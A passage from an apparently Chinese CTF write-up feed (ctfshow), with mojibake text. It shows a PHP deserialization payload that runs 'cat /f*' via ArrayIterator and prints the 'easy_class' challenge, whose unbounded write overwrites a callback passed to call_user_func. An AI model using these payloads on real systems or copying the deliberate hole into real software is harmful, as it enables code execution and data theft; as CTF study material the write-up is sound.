class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span>=<span class="keyword">array</span>(<span class="string">&quot;evil&quot;</span>=&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$oa</span>=<span class="keyword">new</span> <span class="built_in">ArrayIterator</span>(<span class="variable">$arr</span>);</span><br><span class="line"><span class="variable">$res</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$oa</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$res</span>;</span><br><span class="line"><span class="comment">//unserialize($res)</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230404181631721.png" alt="image-20230404181631721"></p><p><strong>è¿‡æ‰€æœ‰æµ‹è¯•å‘ç°å¯ä»¥ç”¨çš„ç±»ä¸ºï¼š</strong></p><ul><li>ArrayObject::unserialize</li><li>ArrayIterator::unserialize</li><li>RecursiveArrayIterator::unserialize</li><li>SplObjectStorage::unserialize</li></ul><p>å…¶ä¸­SplObjectStorageéœ€è¦æ³¨æ„ä¸€ä¸‹ï¼š</p><p><img src="../images/image-20230404181727382.png" alt="image-20230404181727382"></p><p>ç»™åŠ ä¸Šä¸€æ¡å°±è¡Œ</p><p>å‚è€ƒ   â€”â€”â€”&gt;    <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">wp</a></p><h2 id="easy-class"><a href="#easy-class" class="headerlink" title="easy_class"></a>easy_class</h2><p>é¢˜ç›®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-03-27 10:30:30</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-03-28 09:28:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">ctfshow</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_1</span> = <span class="number">0x41</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_2</span> = <span class="number">0x7b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_3</span> = <span class="number">0x5b</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_4</span> = <span class="number">0x60</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_5</span> = <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_OFFSET_6</span> = <span class="number">0x5f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_SIZE__</span>= <span class="number">20</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">__REF_VAL_SIZE__</span>= <span class="number">50</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cursor</span>=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cache</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$ref_table</span>=[];</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$flag</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/flag&quot;</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">define</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$flag</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">neaten</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;flag&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fill</span>(<span class="string">&#x27;ctfshow&#x27;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;ctfshow&#x27;</span>)===<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">read</span>(<span class="string">&#x27;flag&#x27;</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">fill</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]+<span class="number">23</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>)));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_VAL_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache, <span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="string">&quot;\x00&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$var</span></span>)</span>&#123;</span><br><span class="line">        ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">neaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&quot;_clear_&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$arr</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arr</span> = <span class="title function_ invoke__">str_split</span>(<span class="keyword">__NAMESPACE__</span>.<span class="string">&quot;\C::clear&quot;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$arr</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x36d</span>,<span class="string">&#x27;Q&#x27;</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="number">0x30</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">1</span>; <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">readNeaten</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;ref_table[<span class="string">&#x27;_clear_&#x27;</span>]+<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>);</span><br><span class="line">        <span class="variable">$f</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">4</span>));</span><br><span class="line">        <span class="variable">$t</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>-<span class="number">12</span>));</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>));</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params"><span class="variable">$ref</span>,<span class="variable">$size</span></span>)</span>&#123;</span><br><span class="line">        </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkRef</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]=<span class="variable language_">$this</span>-&gt;cursor;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$s</span>),<span class="string">&quot;C&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>); <span class="variable">$i</span> &lt; <span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;C&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;v&quot;</span>,<span class="variable">$size</span>));</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="string">&quot;C&quot;</span>,<span class="number">0x31</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$size</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;\x00&quot;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$ref</span>,<span class="variable">$this</span>-&gt;ref_table))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref not exists!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seekCursor</span>(<span class="variable">$this</span>-&gt;ref_table[<span class="variable">$ref</span>]);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$cref</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">20</span>);</span><br><span class="line">        <span class="variable">$csize</span> = <span class="title function_ invoke__">unpack</span>(<span class="string">&quot;v&quot;</span>, <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">2</span>));</span><br><span class="line">        <span class="variable">$usize</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$val</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$csize</span>[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">truncation</span>(<span class="variable">$val</span>);</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$val</span>,<span class="variable">$fmt</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">seek</span>();</span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$this</span>-&gt;cache,<span class="title function_ invoke__">pack</span>(<span class="variable">$fmt</span>,<span class="variable">$val</span>));</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cursor= <span class="title function_ invoke__">ftell</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$this</span>-&gt;cursor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">truncation</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">str_split</span>(<span class="variable">$data</span>),function(<span class="variable">$var</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$var</span>!==<span class="string">&quot;\x00&quot;</span>;</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">seekCursor</span>(<span class="params"><span class="variable">$cursor</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">rewind</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">        <span class="title function_ invoke__">fseek</span>(<span class="variable">$this</span>-&gt;cache, <span class="variable">$cursor</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkRef</span>(<span class="params"><span class="variable">$ref</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$ref</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">sizeof</span>(<span class="variable">$r</span>)&gt;<span class="built_in">self</span>::<span class="variable constant_">__REF_SIZE__</span>)&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Refenerce size too long!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$r</span>[<span class="number">0</span>]) || <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$r</span>[<span class="number">0</span>]))&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_shift</span>(<span class="variable">$r</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$r</span> <span class="keyword">as</span> <span class="variable">$s</span>) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">checkByte</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\Exception</span>(<span class="string">&quot;Ref invalid!&quot;</span>, <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">checkByte</span>(<span class="params"><span class="variable">$check</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_5</span> || <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_2</span> )&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &gt;=<span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_3</span> &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) &lt;= <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_4</span> </span><br><span class="line">            &amp;&amp; <span class="title function_ invoke__">ord</span>(<span class="variable">$check</span>) !== <span class="built_in">self</span>::<span class="variable constant_">__REF_OFFSET_6</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cache=<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;php://memory&quot;</span>,<span class="string">&quot;wb&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">readNeaten</span>();</span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$this</span>-&gt;cache);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> C;</span><br><span class="line"></span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">main</span>();</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯</strong></p><p>å†™å…¥postå€¼å¾—æ—¶å€™æ²¡é™åˆ¶é•¿åº¦ï¼Œæ‰€ä»¥å¯ä»¥è¦†ç›–åé¢çš„flagå’Œ<em>clear</em>å­˜å‚¨çš„å€¼ï¼Œç„¶åæœ€åè¯»<em>clear</em>æ—¶å€™è°ƒç”¨äº†call_user_func</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow æ„šäººæ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ­å¸ˆæ ¡èµ›å†³èµ›-web</title>
      <link href="/posts/a14faaa5.html"/>
      <url>/posts/a14faaa5.html</url>
      
